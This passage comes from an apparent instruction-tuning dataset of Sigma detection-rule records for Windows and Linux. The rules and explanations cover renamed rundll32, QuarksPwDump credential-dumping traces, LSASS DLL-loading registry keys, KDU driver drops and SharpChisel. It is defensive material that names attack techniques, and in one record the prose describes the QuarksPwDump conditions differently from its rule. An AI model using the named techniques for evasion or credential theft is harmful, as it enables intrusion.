    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'Windows Error Reporting'\n        EventID: 1001\n        Data|contains|all:\n            - 'MsMpEng.exe'\n            - 'mpengine.dll'\n    condition: selection\nfalsepositives:\n    - MsMpEng might crash if the \"C:\\\" partition is full\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'Windows Error Reporting'\n        EventID: 1001\n        Data|contains|all:\n            - 'MsMpEng.exe'\n            - 'mpengine.dll'\n    condition: selection\nfalsepositives:\n    - MsMpEng might crash if the \"C:\\\" partition is full\nlevel: high\n",
      "question": "a suspicious crash of the Microsoft Malware Protection Engine",
      "answer": "In order to detect a suspicious crash of the Microsoft Malware Protection Engine, you should monitor application logs on Windows systems for events generated by the Windows Error Reporting service. Specifically, look for events with a Provider Name of 'Windows Error Reporting' and an EventID of 1001. Crucially, within the data field of these events, ensure that both 'MsMpEng.exe' and 'mpengine.dll' are mentioned. These artifacts are key components of the Microsoft Malware Protection Engine, and their presence in a crash report may indicate a potentially malicious interference or a severe error within the system's protective measures.\n\nHowever, it's significant to acknowledge that not all crashes involving these components are of a malicious origin. For instance, a crash could occur simply because the \"C:\\\" partition on the system is full, which would be a non-malicious, yet critical system issue to resolve. Given the high severity level of this monitoring strategy, it aims to highlight events that could compromise the integrity and reliability of Microsoft's Malware Protection mechanisms, thereby aiding in the swift identification and mitigation of potential threats to the system's security posture."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the PROCEXP152.sys file in the application-data local temporary folder.\nThis driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the PROCEXP152.sys file in the application-data local temporary folder, you should monitor Windows file event logs for instances where a file with the name ending in 'PROCEXP152.sys' is created in the '\\AppData\\Local\\Temp\\' directory. It's crucial to exclude events triggered by known legitimate software, such as Sysinternals Process Explorer (procexp64.exe, procexp.exe) and Process Monitor (procmon64.exe, procmon.exe), by filtering out these processes from the detection logic. This approach is necessary as the specified driver is not only utilized by Process Explorer but could also be associated with malicious tools like KDU and Ghost-In-The-Logs, which employ the driver for potentially harmful activities. Note that while this method serves as a medium-level detection strategy, it is not foolproof. Attackers might bypass this detection mechanism simply by changing the driver's filename, and there might be other legitimate tools that use this driver and filename. Therefore, this detection should be part of a broader security strategy and not solely relied upon for identifying malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\'\n        TargetFilename|endswith: 'PROCEXP152.sys'\n    filter:\n        Image|contains:\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\'\n        TargetFilename|endswith: 'PROCEXP152.sys'\n    filter:\n        Image|contains:\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
      "question": "creation of the PROCEXP152.sys file in the application-data local temporary folder.\nThis driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n",
      "answer": "In order to detect the creation of the PROCEXP152.sys file in the application-data local temporary folder, you should monitor Windows file event logs for instances where a file with the name ending in 'PROCEXP152.sys' is created in the '\\AppData\\Local\\Temp\\' directory. It's crucial to exclude events triggered by known legitimate software, such as Sysinternals Process Explorer (procexp64.exe, procexp.exe) and Process Monitor (procmon64.exe, procmon.exe), by filtering out these processes from the detection logic. This approach is necessary as the specified driver is not only utilized by Process Explorer but could also be associated with malicious tools like KDU and Ghost-In-The-Logs, which employ the driver for potentially harmful activities. Note that while this method serves as a medium-level detection strategy, it is not foolproof. Attackers might bypass this detection mechanism simply by changing the driver's filename, and there might be other legitimate tools that use this driver and filename. Therefore, this detection should be part of a broader security strategy and not solely relied upon for identifying malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket, you should: Look for events generated by the OpenSSH service on Windows systems specifically monitoring the logs that come from the service named openssh. Focus particularly on events with an EventID of 4, which signify in this context that the OpenSSH server (sshd) has initiated and is now listening for incoming connections. This is identified by log entries where the payload field begins with the text 'Server listening on '. It's crucial to be aware that there can be legitimate reasons for these events, such as administrator activity setting up the service. These detections are flagged with a medium alert level, indicating a noteworthy but not definitively malicious activity on its own. Recognizing these activities involves understanding their relationship with potential attack methods, specifically those that relate to enabling unauthorized access or command and control capabilities through the SSH protocol.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: openssh\ndetection:\n    selection:\n        EventID: 4\n        process: sshd\n        payload|startswith: 'Server listening on '\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: openssh\ndetection:\n    selection:\n        EventID: 4\n        process: sshd\n        payload|startswith: 'Server listening on '\n    condition: selection\nfalsepositives:\n    - Legitimate administrator activity\nlevel: medium\n",
      "question": "scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket.",
      "answer": "In order to detect scenarios where an attacker enables the OpenSSH server and server starts to listening on SSH socket, you should: Look for events generated by the OpenSSH service on Windows systems specifically monitoring the logs that come from the service named openssh. Focus particularly on events with an EventID of 4, which signify in this context that the OpenSSH server (sshd) has initiated and is now listening for incoming connections. This is identified by log entries where the payload field begins with the text 'Server listening on '. It's crucial to be aware that there can be legitimate reasons for these events, such as administrator activity setting up the service. These detections are flagged with a medium alert level, indicating a noteworthy but not definitively malicious activity on its own. Recognizing these activities involves understanding their relationship with potential attack methods, specifically those that relate to enabling unauthorized access or command and control capabilities through the SSH protocol."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of rundll32.exe that has been renamed to a different name to avoid detection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of rundll32.exe that has been renamed to a different name to avoid detection, you should monitor the creation of processes on Windows systems. Specifically, look for occurrences where a process is started with an original filename indicating it is 'RUNDLL32.EXE', but the actual image (executable path) does not end with '\\rundll32.exe'. This discrepancy suggests that the file might have been renamed to bypass security measures. It's important to pay close attention to such activities, although it's worth noting that cases not fitting this pattern could occur, their rarity warrants a high level of scrutiny owing to the potential security implications.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'RUNDLL32.EXE'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'RUNDLL32.EXE'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of rundll32.exe that has been renamed to a different name to avoid detection",
      "answer": "In order to detect the execution of rundll32.exe that has been renamed to a different name to avoid detection, you should monitor the creation of processes on Windows systems. Specifically, look for occurrences where a process is started with an original filename indicating it is 'RUNDLL32.EXE', but the actual image (executable path) does not end with '\\rundll32.exe'. This discrepancy suggests that the file might have been renamed to bypass security measures. It's important to pay close attention to such activities, although it's worth noting that cases not fitting this pattern could occur, their rarity warrants a high level of scrutiny owing to the potential security implications.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting QuarksPwDump clearing access history in hive.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect QuarksPwDump clearing access history in hive, you should: Monitor Windows System logs for specific event patterns. This entails watching for events with an ID of 16 that are reported by the \"Microsoft-Windows-Kernel-General\" provider. Specifically, look for events where the HiveName property contains the string '\\AppData\\Local\\Temp\\SAM' or ends with '.dmp'. These characteristics are crucial indicators of attempts to manipulate or clear access history within a hive, potentially to conceal unauthorized actions such as dumping credentials. It's critical to remain vigilant for such events as they are flagged as critical and may not have known false positives, indicating a high confidence level in the detection's significance. This monitoring approach is aligned with understanding tactics and techniques used in unauthorized system access and credential dumping scenarios.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 16\n        Provider_Name: Microsoft-Windows-Kernel-General\n        HiveName|contains: '\\AppData\\Local\\Temp\\SAM'\n        HiveName|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 16\n        Provider_Name: Microsoft-Windows-Kernel-General\n        HiveName|contains: '\\AppData\\Local\\Temp\\SAM'\n        HiveName|endswith: '.dmp'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "QuarksPwDump clearing access history in hive",
      "answer": "In order to detect QuarksPwDump clearing access history in hive, you should: Monitor Windows System logs for specific event patterns. This entails watching for events with an ID of 16 that are reported by the \"Microsoft-Windows-Kernel-General\" provider. Specifically, look for events where the HiveName property contains the string '\\AppData\\Local\\Temp\\SAM' or ends with '.dmp'. These characteristics are crucial indicators of attempts to manipulate or clear access history within a hive, potentially to conceal unauthorized actions such as dumping credentials. It's critical to remain vigilant for such events as they are flagged as critical and may not have known false positives, indicating a high confidence level in the detection's significance. This monitoring approach is aligned with understanding tactics and techniques used in unauthorized system access and credential dumping scenarios."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect and understand an attack that leverages the setupapi.dll library's InstallHinfSection function to achieve persistence by potentially modifying registry values, files, and installing drivers, you should: focus on monitoring process creation events within Windows environments. Specifically, look for instances where 'runonce.exe' is initiated as a process and its parent process is 'rundll32.exe'. The parent process command line should include references to 'setupapi.dll' and 'InstallHinfSection'. These criteria are essential indicators that an attacker might be exploiting the InstallHinfSection function to execute malicious activities, such as modifying Run or RunOnce registry keys for persistence, executing additional processes, or chaining calls to other DLLs. When observing such activities, important information like the Computer Name, User involved, and both the Command Line used to start the process and the Parent Command Line should be collected and analyzed. However, it's important to consider that there might be legitimate scripts and administrative tools using INF files for driver installation with setupapi.dll, which could be misidentified as false positives in this context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium\n",
      "question": "setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.",
      "answer": "In order to detect and understand an attack that leverages the setupapi.dll library's InstallHinfSection function to achieve persistence by potentially modifying registry values, files, and installing drivers, you should: focus on monitoring process creation events within Windows environments. Specifically, look for instances where 'runonce.exe' is initiated as a process and its parent process is 'rundll32.exe'. The parent process command line should include references to 'setupapi.dll' and 'InstallHinfSection'. These criteria are essential indicators that an attacker might be exploiting the InstallHinfSection function to execute malicious activities, such as modifying Run or RunOnce registry keys for persistence, executing additional processes, or chaining calls to other DLLs. When observing such activities, important information like the Computer Name, User involved, and both the Command Line used to start the process and the Parent Command Line should be collected and analyzed. However, it's important to consider that there might be legitimate scripts and administrative tools using INF files for driver installation with setupapi.dll, which could be misidentified as false positives in this context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious execution of Regasm/Regsvcs utilities.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious execution of Regasm/Regsvcs utilities, you should monitor for the creation of processes on Windows systems where the process image ends with \"\\Regsvcs.exe\" or \"\\Regasm.exe\", or where the OriginalFileName is exactly 'RegSvcs.exe' or 'RegAsm.exe'. Additionally, inspect the command line for references to certain directories that are commonly used by attackers as hiding spots for malicious files. These directories include '\\Users\\Public\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\Downloads\\', '\\PerfLogs\\', '\\Windows\\Temp\\', and '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'. It's also crucial to apply a filter to catch executions that involve '.dll' files in the command line, indicating potential misuse of these utilities to load malicious DLLs. However, be mindful to not trigger alerts simply based on the image name appearing in the command line without additional suspicious parameters, as legitimate operations may occasionally align with these conditions. The detection logic aims to encompass various scenarios under which Regasm.exe or Regsvcs.exe execution could signal an attack, considering the high risk associated with the abuse of these utilities for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\Regsvcs.exe'\n            - '\\Regasm.exe'\n        - OriginalFileName:\n            - 'RegSvcs.exe'\n            - 'RegAsm.exe'\n    selection_dir:\n        CommandLine|contains:\n            # Add more suspicious directories\n            - '\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\PerfLogs\\'\n            - '\\Windows\\Temp\\'\n            - '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'\n    filter_main_dll:\n        CommandLine|contains: '.dll'\n    filter_main_no_cli:\n        # For when the CLI just contains the Image\n        CommandLine|endswith:\n            - '\\Regasm.exe\"'\n            - '\\Regasm.exe'\n            - '\\Regsvcs.exe\"'\n            - '\\Regsvcs.exe'\n    condition: all of selection_* or (selection_img and not 1 of filter_main_*)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\Regsvcs.exe'\n            - '\\Regasm.exe'\n        - OriginalFileName:\n            - 'RegSvcs.exe'\n            - 'RegAsm.exe'\n    selection_dir:\n        CommandLine|contains:\n            # Add more suspicious directories\n            - '\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\PerfLogs\\'\n            - '\\Windows\\Temp\\'\n            - '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'\n    filter_main_dll:\n        CommandLine|contains: '.dll'\n    filter_main_no_cli:\n        # For when the CLI just contains the Image\n        CommandLine|endswith:\n            - '\\Regasm.exe\"'\n            - '\\Regasm.exe'\n            - '\\Regsvcs.exe\"'\n            - '\\Regsvcs.exe'\n    condition: all of selection_* or (selection_img and not 1 of filter_main_*)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious execution of Regasm/Regsvcs utilities",
      "answer": "In order to detect suspicious execution of Regasm/Regsvcs utilities, you should monitor for the creation of processes on Windows systems where the process image ends with \"\\Regsvcs.exe\" or \"\\Regasm.exe\", or where the OriginalFileName is exactly 'RegSvcs.exe' or 'RegAsm.exe'. Additionally, inspect the command line for references to certain directories that are commonly used by attackers as hiding spots for malicious files. These directories include '\\Users\\Public\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\Downloads\\', '\\PerfLogs\\', '\\Windows\\Temp\\', and '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'. It's also crucial to apply a filter to catch executions that involve '.dll' files in the command line, indicating potential misuse of these utilities to load malicious DLLs. However, be mindful to not trigger alerts simply based on the image name appearing in the command line without additional suspicious parameters, as legitimate operations may occasionally align with these conditions. The detection logic aims to encompass various scenarios under which Regasm.exe or Regsvcs.exe execution could signal an attack, considering the high risk associated with the abuse of these utilities for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting method to load DLL via LSASS process using an undocumented Registry key.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains:\n            - '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt'\n            - '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'\n    filter_domain_controller:\n        Image: 'C:\\Windows\\system32\\lsass.exe'\n        Details:\n            - '%%systemroot%%\\system32\\ntdsa.dll'\n            - '%%systemroot%%\\system32\\lsadb.dll'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains:\n            - '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt'\n            - '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'\n    filter_domain_controller:\n        Image: 'C:\\Windows\\system32\\lsass.exe'\n        Details:\n            - '%%systemroot%%\\system32\\ntdsa.dll'\n            - '%%systemroot%%\\system32\\lsadb.dll'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "method to load DLL via LSASS process using an undocumented Registry key",
      "answer": "In order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the Sharp Chisel via the commandline arguments.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "usage of the Sharp Chisel via the commandline arguments",
      "answer": "In order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Azure Hybrid Connection Manager services querying the Azure service bus service.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Azure Hybrid Connection Manager services querying the Azure service bus service, you should:\nMonitor DNS query logs from Windows systems, specifically looking for queries that contain the domain 'servicebus.windows.net' in the QueryName. Additionally, pay attention to processes associated with the 'HybridConnectionManager' appearing in the Image field of these queries. This approach aims at identifying potentially malicious or unauthorized attempts to access Azure Service Bus services via the Azure Hybrid Connection Manager. It is crucial, however, to be aware of legitimate activities that may generate similar logs, as proper usage of Azure Hybrid Connection Manager and Azure Service Bus service can lead to similar findings. The level of alert for this detection is categorized as high, indicating that occurrences matching these criteria should be taken seriously and investigated promptly. This activity is linked with specific tactics and techniques in cybersecurity frameworks, providing context for the behavior being monitored.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection:\n        QueryName|contains: 'servicebus.windows.net'\n        Image|contains: 'HybridConnectionManager'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: dns_query\ndetection:\n    selection:\n        QueryName|contains: 'servicebus.windows.net'\n        Image|contains: 'HybridConnectionManager'\n    condition: selection\nfalsepositives:\n    - Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service\nlevel: high\n",
      "question": "Azure Hybrid Connection Manager services querying the Azure service bus service",
      "answer": "In order to detect Azure Hybrid Connection Manager services querying the Azure service bus service, you should:\nMonitor DNS query logs from Windows systems, specifically looking for queries that contain the domain 'servicebus.windows.net' in the QueryName. Additionally, pay attention to processes associated with the 'HybridConnectionManager' appearing in the Image field of these queries. This approach aims at identifying potentially malicious or unauthorized attempts to access Azure Service Bus services via the Azure Hybrid Connection Manager. It is crucial, however, to be aware of legitimate activities that may generate similar logs, as proper usage of Azure Hybrid Connection Manager and Azure Service Bus service can lead to similar findings. The level of alert for this detection is categorized as high, indicating that occurrences matching these criteria should be taken seriously and investigated promptly. This activity is linked with specific tactics and techniques in cybersecurity frameworks, providing context for the behavior being monitored."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of system utilities (only grep and egrep for now) to discover security software discovery.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of system utilities (only grep and egrep for now) to discover security software discovery, you should: monitor process creation events on Linux systems for the execution of 'grep' or 'egrep'. Pay special attention to command lines that contain specific references to security and monitoring tools such as 'nessusd' (Nessus vulnerability scanner), 'td-agent' (Fluentd log shipper), 'packetbeat' (Elastic network logger/shipper), 'filebeat' (Elastic log file shipper), 'auditbeat' (Elastic auditing agent/log shipper), 'osqueryd' (Facebook's osquery), 'cbagentd' (Carbon Black), and 'falcond' (CrowdStrike Falcon). These instances may indicate an adversary's attempt to identify and understand the security landscape of the target system. Be aware that there could be legitimate uses of these commands and tools, which might lead to false positives, and the severity of finding such activity is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            # You can add more grep variations such as fgrep, rgrep...etc\n            - '/grep'\n            - '/egrep'\n        CommandLine|contains:\n            - 'nessusd'        # nessus vulnerability scanner\n            - 'td-agent'       # fluentd log shipper\n            - 'packetbeat'     # elastic network logger/shipper\n            - 'filebeat'       # elastic log file shipper\n            - 'auditbeat'      # elastic auditing agent/log shipper\n            - 'osqueryd'       # facebook osquery\n            - 'cbagentd'       # carbon black\n            - 'falcond'        # crowdstrike falcon\n    condition: selection\nfalsepositives:\n    - Legitimate activities\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            # You can add more grep variations such as fgrep, rgrep...etc\n            - '/grep'\n            - '/egrep'\n        CommandLine|contains:\n            - 'nessusd'        # nessus vulnerability scanner\n            - 'td-agent'       # fluentd log shipper\n            - 'packetbeat'     # elastic network logger/shipper\n            - 'filebeat'       # elastic log file shipper\n            - 'auditbeat'      # elastic auditing agent/log shipper\n            - 'osqueryd'       # facebook osquery\n            - 'cbagentd'       # carbon black\n            - 'falcond'        # crowdstrike falcon\n    condition: selection\nfalsepositives:\n    - Legitimate activities\nlevel: low\n",
      "question": "usage of system utilities (only grep and egrep for now) to discover security software discovery",
      "answer": "In order to detect usage of system utilities (only grep and egrep for now) to discover security software discovery, you should: monitor process creation events on Linux systems for the execution of 'grep' or 'egrep'. Pay special attention to command lines that contain specific references to security and monitoring tools such as 'nessusd' (Nessus vulnerability scanner), 'td-agent' (Fluentd log shipper), 'packetbeat' (Elastic network logger/shipper), 'filebeat' (Elastic log file shipper), 'auditbeat' (Elastic auditing agent/log shipper), 'osqueryd' (Facebook's osquery), 'cbagentd' (Carbon Black), and 'falcond' (CrowdStrike Falcon). These instances may indicate an adversary's attempt to identify and understand the security landscape of the target system. Be aware that there could be legitimate uses of these commands and tools, which might lead to false positives, and the severity of finding such activity is considered low."
    }
  },
  {
